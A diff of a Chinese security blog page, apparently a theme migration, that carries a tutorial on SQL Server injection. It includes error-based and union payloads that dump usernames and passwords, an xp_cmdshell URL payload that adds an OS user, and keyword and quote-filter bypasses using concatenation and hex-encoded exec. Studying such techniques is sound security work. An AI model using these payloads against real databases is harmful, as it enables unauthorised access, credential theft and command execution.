@@ -1,404 +1,225 @@
-<!doctype html>
+<!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
-  
 
 
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Gather ye rosebuds while ye may.">
+  <meta name="author" content="Architect">
+  <meta name="keywords" content="">
+  <title>常见数据库注入技巧——SQL Server - Architect&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
   
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
   
 
   
-    
-    
-  
 
-  
-    
-      
-    
 
-    
-  
+<!-- 主题依赖的图标库，不要自行修改 -->
 
-  
-    
-      
-    
-
-    
-  
-
-  
-    
-      
-    
-
-    
-  
-
-  
-    
-      
-    
-
-    
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
 
 
 
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
 
 
+<link  rel="stylesheet" href="/css/main.css" />
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="SQL Injection," />
+<!-- 自定义样式保持在最底部 -->
 
 
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/images/tubiao.ico?v=5.1.0" />
-
-
-
-
-
-
-<meta name="description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="常见数据库注入技巧——SQL Server">
-<meta property="og:url" content="http://a2chitect.cn/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/index.html">
-<meta property="og:site_name" content="Architect&#39;s Blog">
-<meta property="og:description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
-<meta property="article:published_time" content="2017-11-19T06:40:15.000Z">
-<meta property="article:modified_time" content="2017-11-19T09:19:28.804Z">
-<meta property="article:author" content="Architect">
-<meta property="article:tag" content="SQL Injection">
-<meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/"/>
-
-
-
-
-
-  <title> 常见数据库注入技巧——SQL Server | Architect's Blog </title>
+  <script  src="/js/utils.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Architect's Blog</strong>&nbsp;</a>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Architect's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://a2chitect.cn/2017/11/19/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94SQL%20Server/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Architect">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Architect's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                常见数据库注入技巧——SQL Server
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-19T14:40:15+08:00">
-                2017-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
-          
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2017-11-19 14:40">
+      November 19, 2017 pm
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
 
           
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-file-o"></i>
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>
-          
-
-          
-
-          
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
+
+  <main>
     
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p>
 <a id="more"></a>
 
 <h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><h4 id="通过报错提取信息"><a href="#通过报错提取信息" class="headerlink" title="通过报错提取信息"></a>通过报错提取信息</h4><p>SQL Server 的错误提示十分详细，可以通过引发报错提取需要的信息。</p>
 <h5 id="通过-having-子句枚举表和列"><a href="#通过-having-子句枚举表和列" class="headerlink" title="通过 having 子句枚举表和列"></a>通过 having 子句枚举表和列</h5><p>假设数据库结构和查询语句如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;表结构</span><br><span class="line">create table users（</span><br><span class="line">	id int not null identity(1,1),</span><br><span class="line">	username varchar(20) not null,</span><br><span class="line">	password varchar(20) not null,</span><br><span class="line">	privs int not null,</span><br><span class="line">	email varchar(50)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询语句</span><br><span class="line">select * from users where username&#x3D;&#39;root&#39;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">&#x2F;&#x2F;表结构
+create table users（
+	id int not null identity(1,1),
+	username varchar(20) not null,
+	password varchar(20) not null,
+	privs int not null,
+	email varchar(50)
+)
+
+&#x2F;&#x2F;查询语句
+select * from users where username&#x3D;&#39;root&#39;</code></pre>
 
 <p>注入<code>&#39;having 1=1--</code>语句，由于SQL语言中 having 子句用于过滤组，因此会返回类似如下的错误：</p>
 <p><strong>“选择列表中的列“users.id”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p>
@@ -410,19 +231,23 @@
 <ol>
 <li>嵌入子查询</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;比较数字和字符串</span><br><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and 1&gt;(select top 1 username from users)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">&#x2F;&#x2F;比较数字和字符串
+select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and 1&gt;(select top 1 username from users)</code></pre>
 
 <p>错误提示：<strong>在将varchar值‘root’转换成数据类型 int 时失败。</strong></p>
 <p>利用此方法递归查询可得所有username：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&gt;(select top 1 username from users where username not in(&#39;root&#39;))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and
+	1&gt;(select top 1 username from users where username not in(&#39;root&#39;))</code></pre>
 
 <ol>
 <li>CONVERT( ) 和 CASE( ) 函数（强制类型转换）</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&#x3D;CONVERT(int, (select top 1 users.username from users))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and
+	1&#x3D;CONVERT(int, (select top 1 users.username from users))</code></pre>
 
 <p>可以使用 FOR XML PATH 语句将查询的数据生成XML，代替重复递归操作：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and</span><br><span class="line">	1&#x3D;CONVERT(int, (select stuff((select &#39;,&#39;+ users.username,&#39;|&#39; + users.password from users for xml path(&#39;&#39;)),1,1,&#39;&#39;)))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">select * from users where username&#x3D;&#39;root&#39; and password&#x3D;&#39;root&#39; and
+	1&#x3D;CONVERT(int, (select stuff((select &#39;,&#39;+ users.username,&#39;|&#39; + users.password from users for xml path(&#39;&#39;)),1,1,&#39;&#39;)))</code></pre>
 
 <p>抛出异常：**”在将 nvarchar 值 ‘root|root,admin|admin,xxser|xxser’ 转换成数据类型 int 时失败。” **</p>
 <h4 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h4><p>SQL Server 中常见的系统数据库视图见下表。</p>
@@ -467,10 +292,20 @@
 </tr>
 </tbody></table>
 <p>从这些视图中可以获得有价值的元数据，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获得当前数据库的表名</span><br><span class="line">select table_name from information_schema.tables</span><br><span class="line">&#x2F;&#x2F;获得当前表的列名</span><br><span class="line">select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">&#x2F;&#x2F;获得当前数据库的表名
+select table_name from information_schema.tables
+&#x2F;&#x2F;获得当前表的列名
+select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39;</code></pre>
 
 <h4 id="Order-by-子句"><a href="#Order-by-子句" class="headerlink" title="Order by 子句"></a>Order by 子句</h4><p>Order by 子句常用于探测表的列数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;正常语句</span><br><span class="line">select id,username,password from users where id&#x3D;1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不断增加 ORDER BY 后面的列标号</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 1</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 2</span><br><span class="line">select id,username,password from users where id&#x3D;1 order by 3</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">&#x2F;&#x2F;正常语句
+select id,username,password from users where id&#x3D;1
+
+&#x2F;&#x2F;不断增加 ORDER BY 后面的列标号
+select id,username,password from users where id&#x3D;1 order by 1
+select id,username,password from users where id&#x3D;1 order by 2
+select id,username,password from users where id&#x3D;1 order by 3
+......</code></pre>
 
 <p>假设 users 表共有三列，则当 order by 4 时就会报错：</p>
 <p><strong>“ORDER BY 位置号 4 超出了选择列表中项数的范围”</strong></p>
@@ -480,7 +315,14 @@
 <li>数据类型必须兼容</li>
 </ul>
 <h5 id="union-查询探测列数"><a href="#union-查询探测列数" class="headerlink" title="union 查询探测列数"></a>union 查询探测列数</h5><p>除了用 order by 语句推断列数外，还可以使用 union 查询：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;正常语句</span><br><span class="line">select id,username,password from users where id&#x3D;1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不断增加ORDER BY后面的列标号</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null,null</span><br><span class="line">select id,username,password from users where id&#x3D;1 union select null,null,null</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">&#x2F;&#x2F;正常语句
+select id,username,password from users where id&#x3D;1
+
+&#x2F;&#x2F;不断增加ORDER BY后面的列标号
+select id,username,password from users where id&#x3D;1 union select null
+select id,username,password from users where id&#x3D;1 union select null,null
+select id,username,password from users where id&#x3D;1 union select null,null,null
+......</code></pre>
 
 <p>若 null 的数量与表中字段数不同，则会报错：<br><strong>“使用 UNION、INTERSECT 或 EXCEPT 运算符合并的所有查询必须在其目标列表中有相同数目的表达式”</strong></p>
 <ul>
@@ -489,10 +331,12 @@
 </li>
 </ul>
 <h5 id="union-查询敏感信息"><a href="#union-查询敏感信息" class="headerlink" title="union 查询敏感信息"></a>union 查询敏感信息</h5><p>假设已得知列数为 4，可以使用如下语句注入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">......id&#x3D;1 union select &#39;x&#39;,null,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">......id&#x3D;1 union select &#39;x&#39;,null,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</code></pre>
 
 <p>如果第一行数据类型不匹配，数据库将会报错，可递归查询直至语句正常执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">......id&#x3D;1 union select null,&#39;x&#39;,null,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br><span class="line">......id&#x3D;1 union select null,null,&#39;x&#39;,null from sysobjects where xtype&#x3D;&#39;U&#39;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">......id&#x3D;1 union select null,&#39;x&#39;,null,null from sysobjects where xtype&#x3D;&#39;U&#39;
+......id&#x3D;1 union select null,null,&#39;x&#39;,null from sysobjects where xtype&#x3D;&#39;U&#39;
+......</code></pre>
 
 <p>语句执行正常，代表数据类型兼容，就可以将 x 换为 SQL 语句，查询敏感信息。</p>
 <h4 id="利用系统函数"><a href="#利用系统函数" class="headerlink" title="利用系统函数"></a>利用系统函数</h4><p>所有的数据库系统都会提供很多内置的系统函数，这些函数中有些可以直接返回数据库名、用户名等敏感信息，有些可以对数据进行处理（例如：字符串连接、截取；ASCII码转换等）。这些系统函数为 SQL 注入提供了很大的便利。</p>
@@ -560,428 +404,282 @@
 <h4 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h4><p>存储过程（Stored Procedure）是在大型数据库系统中为完成特定功能的一组 SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
 <p>常见的存储过程功能有：执行系统命令、查看注册表、读取磁盘目录等。</p>
 <p>攻击者最常用的存储过程是 <code>xp_cmdshell</code> ,允许用户执行操作系统命令，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.secbug.org&#x2F;test.aspx?id&#x3D;1;exec xp_cmdshell &#39;net user test test &#x2F;add&#39;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">http:&#x2F;&#x2F;www.secbug.org&#x2F;test.aspx?id&#x3D;1;exec xp_cmdshell &#39;net user test test &#x2F;add&#39;</code></pre>
 
 <p>使用存储过程，必须先拥有相应的权限。</p>
 <h4 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h4><p>SQL Server 支持动态执行语句，用户可以提交一个字符串来执行 SQL 语句，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;select username,password from users&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过关键词过滤</span><br><span class="line">exec(&#39;selec&#39;+&#39;t userneme,password fro&#39;+&#39;m users&#39;)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">exec(&#39;select username,password from users&#39;)
+
+&#x2F;&#x2F;绕过关键词过滤
+exec(&#39;selec&#39;+&#39;t userneme,password fro&#39;+&#39;m users&#39;)</code></pre>
 
 <p>可以通过定义十六进制的SQL语句，使用 exec 函数执行，可以绕过对单引号的过滤机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @query varchar(888)</span><br><span class="line">select @query&#x3D;0x73656C6563742031</span><br><span class="line">exec(@query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;以上命令连接起来</span><br><span class="line">declare&#x2F;**&#x2F;@query&#x2F;**&#x2F;varchar(888)&#x2F;**&#x2F;select&#x2F;**&#x2F;@query&#x3D;0x73656C6563742031&#x2F;**&#x2F;exec(@query)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mssql">declare @query varchar(888)
+select @query&#x3D;0x73656C6563742031
+exec(@query)
+
+&#x2F;&#x2F;以上命令连接起来
+declare&#x2F;**&#x2F;@query&#x2F;**&#x2F;varchar(888)&#x2F;**&#x2F;select&#x2F;**&#x2F;@query&#x3D;0x73656C6563742031&#x2F;**&#x2F;exec(@query)</code></pre>
 
 
 
 <p>（有待更多补充和实践）</p>
 
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
-          
-        </div>
-      
-
-      
-        
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/09/10/%E7%94%B1%E6%B1%89%E8%AF%BA%E5%A1%94%E6%83%B3%E5%88%B0%E7%9A%84/" rel="next" title="由汉诺塔想到的">
-                <i class="fa fa-chevron-left"></i> 由汉诺塔想到的
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/29/Kali-Linux-2017-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" rel="prev" title="Kali Linux 2017 安装配置">
-                Kali Linux 2017 安装配置 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/images/touxiang.jpg"
-               alt="Architect" />
-          <p class="site-author-name" itemprop="name">Architect</p>
-           
-              <p class="site-description motion-element" itemprop="description">Gather ye rosebuds while ye may.</p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">7</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/SQL-Injection/">SQL Injection</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/11/29/Kali-Linux-2017-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kali Linux 2017 安装配置</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2017/09/10/%E7%94%B1%E6%B1%89%E8%AF%BA%E5%A1%94%E6%83%B3%E5%88%B0%E7%9A%84/">
+                        <span class="hidden-mobile">由汉诺塔想到的</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
